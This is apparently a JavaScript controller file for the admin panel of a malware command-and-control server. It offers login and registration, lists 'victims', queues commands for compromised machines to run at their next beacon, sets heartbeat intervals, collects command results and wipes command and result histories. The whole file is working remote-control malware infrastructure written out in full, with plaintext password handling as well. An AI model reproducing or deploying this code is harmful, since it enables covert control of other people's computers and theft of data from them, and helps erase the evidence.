const mongodb = require("../models/mongodb");
const sanitize = require("mongo-sanitize");
const helper = require("../helpers/common");
const authMiddleware = require("../middleware/authMiddleware");

async function register(req, res) {
	const { username, password, register_key } = req.body;

	if (!username || !password || !register_key) {
		return res.send({ status: false, message: "Missing details" });
	}

	if (register_key !== process.env.ADMIN_REGISTER_KEY) {
		return res
			.status(400)
			.send({ status: false, message: "Invalid register key" });
	} else {
		const clean_username = sanitize(username);
		const clean_password = sanitize(password);
		const check = await mongodb.Admins.findOne({
			username: clean_username,
		}).exec();

		if (check == null) {
			const record = new mongodb.Admins({
				username: clean_username,
				password: clean_password,
				accountCreationDate: new Date(),
				active: true,
			});

			await record
				.save()
				.then(async () => {
					console.log("New admin created !");
					const refreshToken = await authMiddleware.generateRefreshToken(
						clean_username,
						"Admin",
					);
					const jwtToken = authMiddleware.generateJwtToken(
						clean_username,
						"Admin",
					);

					return res.status(200).send({ jwtToken, refreshToken });
				})
				.catch((err) => {
					console.log(err);
					return res
						.status(500)
						.send({ status: false, message: "Unknown error" });
				});
		} else {
			return res.status(400).send({
				status: false,
				message: "Username exists or unknown error occured",
			});
		}
	}
}

async function login(req, res) {
	const { username, password } = req.body;

	if (!username || !password) {
		return res.send({ status: false, message: "Missing details" });
	} else {
		const clean_username = sanitize(username);
		const clean_password = sanitize(password);

		const check = await mongodb.Admins.findOne({
			username: clean_username,
			password: clean_password,
		}).exec();

		if (check == null) {
			return res
				.status(400)
				.send({ status: false, message: "Invalid credentials" });
		} else {
			const jwtToken = authMiddleware.generateJwtToken(clean_username, "Admin");
			const refreshToken = await authMiddleware.generateRefreshToken(
				clean_username,
				"Admin",
			);

			return res.status(200).send({ status: true, jwtToken, refreshToken });
		}
	}
}

const refresh = async (req, res) => {
	const refreshToken = sanitize(req.body.refreshToken);
	const username = sanitize(req.body.username);

	if (!refreshToken || !username) {
		return res.send({ status: false, message: "No Token Provided!" });
	}
	await authMiddleware.verifyRefreshToken(refreshToken, username, res);
};

const getAllVictims = async (req, res) => {
	if (req.decoded.privs != "Admin") {
		return res
			.status(403)
			.send({ status: false, message: "Insuffiecient privileges" });
	} else {
		try {
			const allVictims = await mongodb.Victims.find().exec();

			return res.status(200).send({ status: true, data: allVictims });
		} catch (e) {
			console.log(e);
			return res
				.status(500)
				.send({ status: false, data: "Unknown error occured" });
		}
	}
};

const addNewCmd = async (req, res) => {
	if (req.decoded.privs != "Admin") {
		return res
			.status(403)
			.send({ status: false, message: "Insuffiecient privileges" });
	} else {
		const { victimId, command } = req.body;

		if (!victimId || !command) {
			return res.send({ status: false, message: "Broken request" });
		} else {
			const newCmd = new mongodb.VictimCommands({
				victimId: sanitize(victimId),
				command: sanitize(command),
				active: true,
			});
			await newCmd
				.save()
				.then(async () => {
					console.log("New admin created !");

					return res.send({
						status: true,
						message:
							"Command saved successfully. It will be run by given victim id in next interval",
					});
				})
				.catch((e) => {
					console.log(e);
					return res
						.status(500)
						.send({ status: false, message: "Unknown error" });
				});
		}
	}
};

async function deleteAccount(req, res) {
	const privs = req.decoded["privs"];

	if (privs !== "Admin") {
		return res
			.status(403)
			.send({ status: false, message: "Insuffiecient privileges" });
	} else {
		const username = req.decoded["username"];

		const account = await mongodb.Admins.findOne({
			username: sanitize(username),
		}).exec();

		if (account == null) {
			return res.send({
				status: false,
				message: "Could not find account, troubleshooting required",
			});
		} else {
			const returnCheck = await mongodb.Admins.deleteOne(account).exec();
			if (returnCheck == 1 || returnCheck == "1") {
				return res.send({
					status: true,
					message: "Account deleted successfully",
				});
			} else {
				return res
					.status(500)
					.send({ status: false, message: "Unknown error" });
			}
		}
	}
}

async function updateInterval(req, res) {
	const privs = req.decoded["privs"];

	if (privs !== "Admin") {
		return res
			.status(403)
			.send({ status: false, message: "Insuffiecient privileges" });
	} else {
		const { heartBeatInterval, victimId } = req.body;

		if (!heartBeatInterval || !victimId) {
			return res.send({ status: false, message: "Broken request" });
		} else {
			try {
				const filter = { victimId: sanitize(victimId) };
				const update = {
					heartBeatInterval: Number(sanitize(heartBeatInterval)),
				};
				const updateq = await mongodb.Victims.findOneAndUpdate(filter, update, {
					new: true,
				}).exec();
				console.log(updateq);
				return res
					.status(200)
					.send({ status: true, message: "Interval updated successfully" });
			} catch (e) {
				console.log(e);
				return res
					.status(500)
					.send({ status: false, message: "Unknown error" });
			}
		}
	}
}

const commandHistory = async (req, res) => {
	const privs = req.decoded["privs"];

	if (privs !== "Admin") {
		return res
			.status(403)
			.send({ status: false, message: "Insuffiecient privileges" });
	} else {
		const { victimId } = req.body;

		if (!victimId) {
			return res.send({ status: false, message: "Broken request" });
		} else {
			const history = await mongodb.VictimCommands.find({
				victimId: sanitize(victimId),
			}).exec();

			if (history !== null && history.length != 0) {
				return res.status(200).send({ status: true, data: history });
			} else {
				return res
					.status(403)
					.send({ status: false, message: "No commands returned" });
			}
		}
	}
};

const clearCommandHistory = async (req, res) => {
	const privs = req.decoded["privs"];

	if (privs !== "Admin") {
		return res
			.status(403)
			.send({ status: false, message: "Insuffiecient privileges" });
	} else {
		const { victimId } = req.body;

		if (!victimId) {
			return res.send({ status: false, message: "Broken request" });
		} else {
			try {
				await mongodb.VictimCommands.deleteMany({
					victimId: sanitize(victimId),
				}).exec();

				return res
					.status(200)
					.send({ status: true, message: "Cleared history for given victim" });
			} catch (e) {
				console.log(e);
				return res
					.status(500)
					.send({ status: false, message: "Unknown error" });
			}
		}
	}
};

const commandResultHistory = async (req, res) => {
	const privs = req.decoded["privs"];

	if (privs !== "Admin") {
		return res
			.status(403)
			.send({ status: false, message: "Insuffiecient privileges" });
	} else {
		const { victimId } = req.body;

		if (!victimId) {
			return res.send({ status: false, message: "Broken request" });
		} else {
			const history = await mongodb.CommandResults.find({
				victimId: sanitize(victimId),
			}).exec();

			if (history !== null && history.length != 0) {
				return res.status(200).send({ status: true, data: history });
			} else {
				return res
					.status(403)
					.send({ status: false, message: "No commands returned" });
			}
		}
	}
};

const clearCommandResultHistory = async (req, res) => {
	const privs = req.decoded["privs"];

	if (privs !== "Admin") {
		return res
			.status(403)
			.send({ status: false, message: "Insuffiecient privileges" });
	} else {
		const { victimId } = req.body;

		if (!victimId) {
			return res.send({ status: false, message: "Broken request" });
		} else {
			try {
				await mongodb.CommandResults.deleteMany({
					victimId: sanitize(victimId),
				}).exec();

				return res
					.status(200)
					.send({ status: true, message: "Cleared history for given victim" });
			} catch (e) {
				console.log(e);
				return res
					.status(500)
					.send({ status: false, message: "Unknown error" });
			}
		}
	}
};

module.exports = {
	login,
	register,
	refresh,
	getAllVictims,
	addNewCmd,
	deleteAccount,
	updateInterval,
	commandHistory,
	clearCommandHistory,
	commandResultHistory,
	clearCommandResultHistory
};
